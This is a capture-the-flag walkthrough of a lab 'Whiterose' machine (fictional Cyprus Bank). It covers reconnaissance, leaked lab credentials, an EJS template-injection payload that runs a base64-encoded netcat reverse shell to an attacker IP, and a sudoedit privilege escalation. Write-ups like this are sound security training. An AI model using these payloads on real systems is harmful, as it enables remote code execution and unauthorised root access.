# 🌹 Whiterose CTF Walkthrough

*"It's not about who I am, it's about what I can do."*  

**Date**: January 4, 2025  
**Target**: Cyprus Bank  

## 🔍 Initial Recon

### 1. Network Scanning with Nmap
Kicked  things off with an aggressive scan:

nmap -Pn -sV -vv 10.10.15.61

Findings:

    SSH on port 22 (OpenSSH 7.6p1 Ubuntu)

    Web server on port 80 (nginx 1.14.0)

## 🚪 Gaining Access ###
2. Credentials Found

Stumbled upon login details:

    Username: Olivia Cortez

    Password: olivi8

3. Subdomain Enumeration

Used ffuf to hunt for hidden subdomains:
bash

ffuf -u http://cyprusbank.thm -H "HOST:FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 1

Jackpot: Found admin.cyprusbank.thm (added to /etc/hosts)
 ### 🎯 Challenges Solved ###
Q1: Tyller Wellick's Phone Number

The number was hidden in messages...

Trick: Changed message count to 0 to reveal all history
Bonus: Found Gayle Bev's old password: p~]P@5!6;rs558:q
Q2: user.txt Flag

Approach:

    Logged in as Tylerr Wellick (password: admin)

    Intercepted with Burp Suite → deleted password:& → sent just a&

    Discovered /settings.ejs vulnerability

EJS Exploit:
javascript

settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC45LjI1NS40IDg4ODggLWUgL2Jpbi9zaA== | base64 -d | bash"');s

Shell Stabilization:
bash

python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm

Flag: THM{4lways_upd4te_uR_d3p3nd3nc!3s}
 ### 👑 Privilege Escalation ###
Q3: Root Flag

Method:

    Ran sudo -l to check privileges

    Exploited sudoedit vulnerability:

bash

export EDITOR="vim -- /root/root.txt"
sudoedit /etc/nginx/sites-available/...

Pro Tip: Always check sudo permissions - sometimes the path to root is simpler than you think!
### 💡 Lessons Learned ###

    EJS templates can be dangerous if not properly secured

    Always encode your reverse shells when dealing with web apps

    sudoedit is a sneaky privilege escalation vector

Happy hacking! 🚩
